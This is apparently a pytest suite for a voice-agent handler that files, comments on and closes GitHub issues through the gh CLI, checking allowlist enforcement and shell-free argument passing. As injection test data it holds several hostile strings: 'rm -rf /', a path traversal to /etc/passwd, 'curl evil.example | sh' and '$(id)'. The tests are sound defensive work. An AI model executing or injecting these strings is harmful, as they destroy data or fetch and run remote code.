"""The GitHub outbox handler (#50). No network: `subprocess.run` is always mocked.

The tests that matter here are the refusals, and one above all: **the target
repository comes from config, never from the request.** The credential behind this
handler is a write-capable token on the operator's own account, and the sentence
that triggers a filing came out of a microphone worn in public. So a request may
only pick from `ATTICUS_GITHUB_REPOS`; a repo it names that is not on the list must
be refused *before* anything reaches `gh`, and every assertion of that shape below
also asserts that no subprocess ran at all.
"""
import json
import subprocess
from pathlib import Path

import handlers.github as ghh
import outbox
import pytest
from config import Config
from handlers.github import add_comment, create_issue

REPO = Path(__file__).resolve().parents[2]
REPOS = ["beekeeper-lab/atticus", "beekeeper-lab/atticus-vault"]


@pytest.fixture
def gcfg(cfg):
    """A config with GitHub configured. ops/.env.example ships it OFF."""
    cfg.github_repos = list(REPOS)
    cfg.github_labels = []
    cfg.gh_bin = "gh"
    cfg.github_timeout = 5
    return cfg


class Fake:
    """Stands in for subprocess.run. Records argv; never launches anything."""

    def __init__(self, rc=0, stdout="https://github.com/beekeeper-lab/atticus/issues/57",
                 stderr="", boom=None):
        self.rc, self.stdout, self.stderr, self.boom = rc, stdout, stderr, boom
        self.calls, self.kwargs = [], []

    def __call__(self, cmd, **kw):
        self.calls.append(cmd)
        self.kwargs.append(kw)
        if self.boom:
            raise self.boom
        return subprocess.CompletedProcess(cmd, self.rc, self.stdout, self.stderr)


@pytest.fixture
def gh(monkeypatch):
    f = Fake()
    monkeypatch.setattr(ghh.subprocess, "run", f)
    return f


def flag(cmd, name):
    """The value `gh` would see for one flag."""
    return cmd[cmd.index(name) + 1] if name in cmd else None


def quiet(_msg):
    pass


# ── registration ───────────────────────────────────────────────────────────
def test_the_three_verbs_are_registered_and_no_others():
    """A verb only exists if handlers/__init__ imports the module. It didn't, once.

    close joined issue and comment on 2026-08-02. push, merge, workflow dispatch,
    reopen and delete remain deliberately absent (#50) — each is its own risk
    decision, and delete is not coming at all.
    """
    ours = sorted(v for v in outbox.known_verbs() if v.startswith("github."))
    assert ours == ["github.close", "github.comment", "github.issue"]


def test_filing_is_tracked_not_outward():
    """An issue is visible to others but editable and closable. It is also NOT
    internal: defaulting it to auto would let ambient speech file into a tracker
    other people read."""
    assert outbox.handler_for("github.issue")["risk"] == outbox.TRACKED
    assert outbox.handler_for("github.comment")["risk"] == outbox.TRACKED


def test_a_request_without_a_title_is_refused_before_the_handler():
    with pytest.raises(outbox.OutboxError, match="title"):
        outbox.validate({"verb": "github.issue", "body": "just a body"})


def test_a_comment_needs_both_the_number_and_the_body():
    with pytest.raises(outbox.OutboxError, match="body"):
        outbox.validate({"verb": "github.comment", "issue": "42"})


# ── the allowlist IS the control ───────────────────────────────────────────
def test_the_repo_comes_from_config_when_the_request_names_none(gcfg, gh):
    res = create_issue({"title": "Timer never fires"}, gcfg, log=quiet)
    assert flag(gh.calls[0], "--repo") == "beekeeper-lab/atticus"
    assert res["repo"] == "beekeeper-lab/atticus"


def test_a_repo_the_request_names_is_only_a_SELECTOR_from_the_allowlist(gcfg, gh):
    """A bare name is what a person says out loud, so it is accepted — but it is
    matched against the list, not combined with an owner."""
    create_issue({"title": "t", "repo": "atticus-vault"}, gcfg, log=quiet)
    assert flag(gh.calls[0], "--repo") == "beekeeper-lab/atticus-vault"


def test_a_repo_outside_the_allowlist_is_refused_and_gh_is_never_called(gcfg, gh):
    """THE test. One misheard sentence must not be able to file into any repository
    the operator's token can reach."""
    with pytest.raises(outbox.OutboxError) as e:
        create_issue({"title": "t", "repo": "openai/openai-python"}, gcfg, log=quiet)
    assert "not a permitted repository" in str(e.value)
    assert "beekeeper-lab/atticus" in str(e.value), "must name what IS permitted"
    assert gh.calls == [], "nothing may reach gh once the repo is refused"


def test_a_matching_NAME_under_a_different_OWNER_is_refused(gcfg, gh):
    """The half-match is the dangerous one: 'atticus' is allowlisted, so a handler
    that split and recombined would happily file into someone else's fork."""
    with pytest.raises(outbox.OutboxError, match="not a permitted"):
        create_issue({"title": "t", "repo": "evil-org/atticus"}, gcfg, log=quiet)
    assert gh.calls == []


@pytest.mark.parametrize("asked", [
    "../../etc/passwd", "atticus; rm -rf /", "--json", "-R evil/x",
    "https://github.com/evil/atticus", "beekeeper-lab/atticus extra",
])
def test_a_repo_shaped_like_an_attack_is_just_refused(gcfg, gh, asked):
    with pytest.raises(outbox.OutboxError):
        create_issue({"title": "t", "repo": asked}, gcfg, log=quiet)
    assert gh.calls == []


def test_an_ambiguous_bare_name_is_refused_rather_than_guessed(gcfg, gh):
    gcfg.github_repos = ["one/notes", "two/notes"]
    with pytest.raises(outbox.OutboxError, match="ambiguous"):
        create_issue({"title": "t", "repo": "notes"}, gcfg, log=quiet)
    assert gh.calls == []


def test_an_empty_allowlist_disables_the_capability(gcfg, gh):
    """Blank is the shipped default, so this is the state of a fresh install: the
    verb exists, the skill routes to it, and the action is refused by name."""
    gcfg.github_repos = []
    with pytest.raises(outbox.OutboxError, match="ATTICUS_GITHUB_REPOS"):
        create_issue({"title": "t"}, gcfg, log=quiet)
    assert gh.calls == []


def test_a_malformed_allowlist_entry_is_never_handed_to_gh(gcfg, gh):
    """These come from the operator, not the agent — but an entry like '--json'
    would land in argv where gh reads it as a flag."""
    gcfg.github_repos = ["--json", "not-a-repo"]
    with pytest.raises(outbox.OutboxError, match="owner/name"):
        create_issue({"title": "t"}, gcfg, log=quiet)
    assert gh.calls == []


def test_the_repo_is_always_explicit_so_the_cwd_cannot_decide(gcfg, gh):
    """The processor runs inside a git checkout, and `gh` infers a repo from cwd."""
    create_issue({"title": "t"}, gcfg, log=quiet)
    add_comment({"issue": "42", "body": "b"}, gcfg, log=quiet)
    assert all("--repo" in c for c in gh.calls)


# ── the argv ───────────────────────────────────────────────────────────────
def test_an_issue_is_created_with_the_title_and_body_as_argv_values(gcfg, gh):
    res = create_issue({"title": "Backlog alarm never fires",
                        "body": "Said on the drive home."}, gcfg, log=quiet)
    cmd = gh.calls[0]
    assert cmd[:3] == ["gh", "issue", "create"]
    assert flag(cmd, "--title") == "Backlog alarm never fires"
    assert flag(cmd, "--body").startswith("Said on the drive home.")
    assert res["url"].endswith("/57") and res["number"] == 57


def test_a_comment_is_posted_to_the_numbered_issue(gcfg, gh):
    gh.stdout = "https://github.com/beekeeper-lab/atticus/issues/42#issuecomment-991"
    res = add_comment({"issue": "#42", "body": "Also happens on Forge."}, gcfg, log=quiet)
    cmd = gh.calls[0]
    assert cmd[:4] == ["gh", "issue", "comment", "42"]
    assert flag(cmd, "--body").startswith("Also happens on Forge.")
    assert res["number"] == 42, "the issue number, not the comment anchor"


@pytest.mark.parametrize("bad", ["forty-two", "the budget one", "", "#", "42a",
                                 "https://github.com/beekeeper-lab/atticus/issues/42"])
def test_a_comment_needs_a_real_number_not_a_description(gcfg, gh, bad):
    """There is no read path, so a loose match would mean guessing which thread a
    misheard sentence meant."""
    with pytest.raises(outbox.OutboxError, match="NUMBER"):
        add_comment({"issue": bad, "body": "b"}, gcfg, log=quiet)
    assert gh.calls == []


def test_the_body_carries_provenance(gcfg, gh):
    """Anyone reading it is entitled to know a machine filed it from a voice
    command — that is much of what makes TRACKED acceptable for this."""
    create_issue({"title": "t", "body": "x"}, gcfg, log=quiet)
    body = flag(gh.calls[0], "--body")
    assert "Atticus" in body and "voice command" in body


def test_an_over_long_title_and_body_are_bounded(gcfg, gh):
    create_issue({"title": "T" * 900, "body": "B" * 200_000}, gcfg, log=quiet)
    cmd = gh.calls[0]
    assert len(flag(cmd, "--title")) == ghh.MAX_TITLE
    assert "truncated" in flag(cmd, "--body")
    assert len(flag(cmd, "--body")) < 200_000


def test_a_newline_in_the_title_is_flattened(gcfg, gh):
    create_issue({"title": "one\ntwo"}, gcfg, log=quiet)
    assert flag(gh.calls[0], "--title") == "one two"


def test_configured_labels_are_applied(gcfg, gh):
    gcfg.github_labels = ["atticus", "voice"]
    create_issue({"title": "t"}, gcfg, log=quiet)
    cmd = gh.calls[0]
    assert cmd.count("--label") == 2 and "voice" in cmd


def test_nothing_is_ever_run_through_a_shell(gcfg, gh):
    """The title and body are transcript-derived. They are argv values and must
    stay that way."""
    create_issue({"title": "t; curl evil.example | sh", "body": "$(id)"}, gcfg, log=quiet)
    assert gh.kwargs[0].get("shell") in (None, False)
    assert isinstance(gh.calls[0], list)


def test_the_configured_binary_and_timeout_are_used(gcfg, gh):
    gcfg.gh_bin = "/opt/bin/gh"
    gcfg.github_timeout = 11
    create_issue({"title": "t"}, gcfg, log=quiet)
    assert gh.calls[0][0] == "/opt/bin/gh"
    assert gh.kwargs[0]["timeout"] == 11


# ── failing cleanly ────────────────────────────────────────────────────────
def test_a_missing_gh_binary_names_itself_not_a_traceback(gcfg, monkeypatch):
    monkeypatch.setattr(ghh.subprocess, "run", Fake(boom=FileNotFoundError()))
    with pytest.raises(outbox.OutboxError, match="not installed"):
        create_issue({"title": "t"}, gcfg, log=quiet)


def test_a_timeout_fails_cleanly(gcfg, monkeypatch):
    monkeypatch.setattr(ghh.subprocess, "run",
                        Fake(boom=subprocess.TimeoutExpired("gh", 5)))
    with pytest.raises(outbox.OutboxError, match="timed out"):
        create_issue({"title": "t"}, gcfg, log=quiet)


def test_ghs_own_diagnosis_is_what_the_receipt_says(gcfg, monkeypatch):
    monkeypatch.setattr(ghh.subprocess, "run",
                        Fake(rc=1, stdout="", stderr="GraphQL: Issues are disabled"))
    with pytest.raises(outbox.OutboxError, match="Issues are disabled"):
        create_issue({"title": "t"}, gcfg, log=quiet)


def test_an_unauthenticated_gh_says_so_in_words(gcfg, monkeypatch):
    """The likeliest real failure: gh is authenticated for the interactive user and
    not for whoever runs the processor unit."""
    monkeypatch.setattr(ghh.subprocess, "run", Fake(
        rc=4, stdout="", stderr="gh: To get started with GitHub CLI, "
                                "please run: gh auth login"))
    with pytest.raises(outbox.OutboxError, match="not authenticated"):
        create_issue({"title": "t"}, gcfg, log=quiet)


def test_a_missing_label_is_explained_rather_than_echoed(gcfg, monkeypatch):
    monkeypatch.setattr(ghh.subprocess, "run", Fake(
        rc=1, stdout="", stderr="could not add label: 'voice' not found"))
    gcfg.github_labels = ["voice"]
    with pytest.raises(outbox.OutboxError, match="ATTICUS_GITHUB_LABELS"):
        create_issue({"title": "t"}, gcfg, log=quiet)


def test_a_nonzero_exit_with_no_output_still_says_something(gcfg, monkeypatch):
    monkeypatch.setattr(ghh.subprocess, "run", Fake(rc=2, stdout="", stderr=""))
    with pytest.raises(outbox.OutboxError, match="exit status 2"):
        create_issue({"title": "t"}, gcfg, log=quiet)


# ── through the outbox, end to end ─────────────────────────────────────────
def _intent(out, name, **body):
    (out / "outbox").mkdir(parents=True, exist_ok=True)
    (out / "outbox" / name).write_text(json.dumps(body))


def test_a_filing_is_held_for_confirmation_by_default(tmp_path, gcfg, gh):
    """Nobody is present during a pass, so `tracked=confirm` means "not this pass".
    The intent is recorded; gh is not run."""
    out = tmp_path / "output"
    _intent(out, "001-github.issue.json", verb="github.issue", title="Timer stalls")
    res = outbox.process(out, gcfg, log=quiet)
    assert res["receipts"][0]["status"] == "held"
    assert gh.calls == []


def test_with_tracked_opened_the_receipt_carries_the_issue_url(tmp_path, gcfg, gh):
    out = tmp_path / "output"
    gcfg.outbox_tracked = "auto"
    _intent(out, "001-github.issue.json", verb="github.issue",
            title="Timer stalls", body="from the drive home")
    res = outbox.process(out, gcfg, log=quiet)
    r = res["receipts"][0]
    assert res["done"] == 1 and r["status"] == "done"
    assert r["number"] == 57 and r["repo"] == "beekeeper-lab/atticus"
    assert r["summary"] == "file a GitHub issue on the default repo: Timer stalls"


def test_a_refused_repo_is_a_receipt_not_a_crash(tmp_path, gcfg, gh):
    """The pass must survive it: the report the agent already wrote is worth more
    than the issue that did not get filed."""
    out = tmp_path / "output"
    gcfg.outbox_tracked = "auto"
    _intent(out, "001-github.issue.json", verb="github.issue", title="t",
            repo="someone-else/private")
    res = outbox.process(out, gcfg, log=quiet)
    assert res["failed"] == 1 and gh.calls == []
    assert "not a permitted repository" in res["receipts"][0]["reason"]


# ── the shipped configuration ──────────────────────────────────────────────
def test_the_shipped_example_ships_no_allowlist():
    """Fail closed. Nothing in this repo should name a repository, and an operator
    who has not thought about the blast radius should not have one configured."""
    c = Config(env_file=REPO / "ops/.env.example")
    assert c.github_repos == []
    assert c.github_labels == []
    assert c.gh_bin == "gh" and c.github_timeout > 0


def test_the_skill_tells_the_agent_it_cannot_read_from_github():
    """The description is what routes a spoken request, and the read gap is the
    thing most likely to be misrouted into this skill."""
    text = (REPO / "skills/github/SKILL.md").read_text()
    assert "name: github" in text
    for must in ("github.issue", "github.comment", "output/outbox/",
                 "NNN-verb.json", "allowlist"):
        assert must in text, must
    assert "Do NOT use" in text, "the negative half of the description is what routes"


# ── github.close ────────────────────────────────────────────────────────────
# Added after a spoken request — "find the issue you created for the Slack
# integration and close it" — that the agent correctly refused, because it could
# neither close an issue nor look one up. Both halves are here: closing, and
# PIPELINE-SIDE resolution of words to a number (ADR-006's pattern, per contacts).

class FakeSeq:
    """subprocess.run answering a SEQUENCE: the issue list, then the close."""

    def __init__(self, issues, close_rc=0, close_err=""):
        self.issues = issues
        self.close_rc, self.close_err = close_rc, close_err
        self.calls = []

    def __call__(self, cmd, **kw):
        self.calls.append(cmd)
        if "list" in cmd:
            return subprocess.CompletedProcess(cmd, 0, json.dumps(self.issues), "")
        return subprocess.CompletedProcess(
            cmd, self.close_rc, "" if self.close_rc == 0 else "",
            self.close_err)


def _close(cfg, **req):
    return ghh.close_issue({"verb": "github.close", **req}, cfg, log=lambda m: None)


def test_close_by_number_never_lists(gcfg, gh):
    out = _close(gcfg, issue="#57")
    assert out["number"] == 57 and out["reason"] == "completed"
    assert len(gh.calls) == 1, "a number needs no lookup"
    cmd = gh.calls[0]
    assert cmd[:3] == ["gh", "issue", "close"] and "57" in cmd
    assert flag(cmd, "--repo") == REPOS[0]
    assert flag(cmd, "--reason") == "completed"


def test_close_resolves_words_to_one_open_issue(gcfg, monkeypatch):
    f = FakeSeq([{"number": 76, "title": "Test issue: verify the Slack integration end-to-end"},
                 {"number": 12, "title": "Something unrelated"}])
    monkeypatch.setattr(ghh.subprocess, "run", f)
    out = _close(gcfg, match="Slack integration")
    assert out["number"] == 76
    assert "Slack" in out["resolved_by"]
    listing, closing = f.calls
    assert "list" in listing and flag(listing, "--state") == "open", \
        "only OPEN issues may be matched — a replay must not re-close settled work"
    assert flag(listing, "--repo") == REPOS[0], "the search is scoped to the allowlist"
    assert "76" in closing


def test_close_matches_on_all_words_when_the_phrase_is_not_literal(gcfg, monkeypatch):
    f = FakeSeq([{"number": 76, "title": "Test issue: verify the Slack integration end-to-end"}])
    monkeypatch.setattr(ghh.subprocess, "run", f)
    assert _close(gcfg, match="slack integration test")["number"] == 76


def test_an_ambiguous_match_refuses_and_names_the_candidates(gcfg, monkeypatch):
    f = FakeSeq([{"number": 1, "title": "Slack integration flakes"},
                 {"number": 2, "title": "Slack integration docs"}])
    monkeypatch.setattr(ghh.subprocess, "run", f)
    with pytest.raises(outbox.OutboxError) as e:
        _close(gcfg, match="Slack integration")
    assert "#1" in str(e.value) and "#2" in str(e.value)
    assert len(f.calls) == 1, "nothing may be closed while it is ambiguous"


def test_no_match_refuses_rather_than_closing_something_else(gcfg, monkeypatch):
    f = FakeSeq([{"number": 9, "title": "Totally different"}])
    monkeypatch.setattr(ghh.subprocess, "run", f)
    with pytest.raises(outbox.OutboxError, match="no OPEN issue"):
        _close(gcfg, match="Slack integration")
    assert len(f.calls) == 1


@pytest.mark.parametrize("req,expect", [
    ({}, "needs `issue`"),
    ({"match": "ab"}, "too short"),
    ({"issue": "the slack one"}, "NUMBER"),
])
def test_unusable_arguments_refuse_before_gh_runs(gcfg, gh, req, expect):
    with pytest.raises(outbox.OutboxError, match=expect):
        _close(gcfg, **req)
    assert gh.calls == []


def test_a_repo_off_the_allowlist_is_refused_before_gh_runs(gcfg, gh):
    with pytest.raises(outbox.OutboxError, match="not a permitted repository"):
        _close(gcfg, issue="1", repo="evil-org/atticus")
    assert gh.calls == [], "the allowlist is checked before anything reaches gh"


@pytest.mark.parametrize("spoken,sent", [
    ("", "completed"), ("done", "completed"), ("completed", "completed"),
    ("not planned", "not planned"), ("wontfix", "not planned"),
    ("Declined", "not planned"),
])
def test_reason_maps_spoken_words_to_githubs_two_values(gcfg, gh, spoken, sent):
    """'We're not doing that' must not land as *completed* — that tells everyone
    watching the repo the work got done."""
    assert _close(gcfg, issue="5", reason=spoken)["reason"] == sent
    assert flag(gh.calls[-1], "--reason") == sent


def test_an_unknown_reason_refuses(gcfg, gh):
    with pytest.raises(outbox.OutboxError, match="completed"):
        _close(gcfg, issue="5", reason="because I said so")
    assert gh.calls == []


def test_a_close_comment_carries_the_provenance_footer(gcfg, gh):
    out = _close(gcfg, issue="5", comment="Handled on the drive home.")
    body = flag(gh.calls[-1], "--comment")
    assert "Handled on the drive home." in body
    assert "Filed by [Atticus]" in body, "a machine closing an issue must say so"
    assert out["commented"] is True


def test_no_comment_means_no_comment_flag(gcfg, gh):
    assert _close(gcfg, issue="5")["commented"] is False
    assert "--comment" not in gh.calls[-1]


def test_gh_failure_becomes_a_readable_outbox_error(gcfg, monkeypatch):
    f = FakeSeq([], close_rc=1, close_err="HTTP 403: Resource not accessible")
    monkeypatch.setattr(ghh.subprocess, "run", f)
    with pytest.raises(outbox.OutboxError, match="403"):
        _close(gcfg, issue="5")


def test_the_verb_is_registered_tracked_and_described(gcfg):
    h = outbox.handler_for("github.close")
    assert h is not None and h["risk"] == outbox.TRACKED
    assert "#57" in outbox.describe({"verb": "github.close", "issue": "57"})
    assert "Slack" in outbox.describe({"verb": "github.close", "match": "Slack"})


def test_the_skill_documents_the_verb_the_handler_registers():
    md = (REPO / "skills/github/SKILL.md").read_text()
    assert "github.close" in md
    assert "not planned" in md, "the reason field must be documented or it is unused"
    assert "no reopen" in md.lower()


def test_the_skill_DESCRIPTION_advertises_closing():
    """The frontmatter, not the body, is what routing reads.

    Observed 2026-08-02: the body documented github.close and the description
    still said "Do NOT use it to ... reopen or close anything". A spoken "close
    the issue called voice test target" reached the skill and the agent refused,
    citing its own instructions — correctly. A capability the description denies
    does not exist, however well the body documents it.
    """
    md = (REPO / "skills/github/SKILL.md").read_text()
    front = md.split("---")[1].lower()
    assert "close" in front, "the description must advertise closing"
    assert "reopen or close anything" not in front, \
        "the old prohibition survived a capability being added"
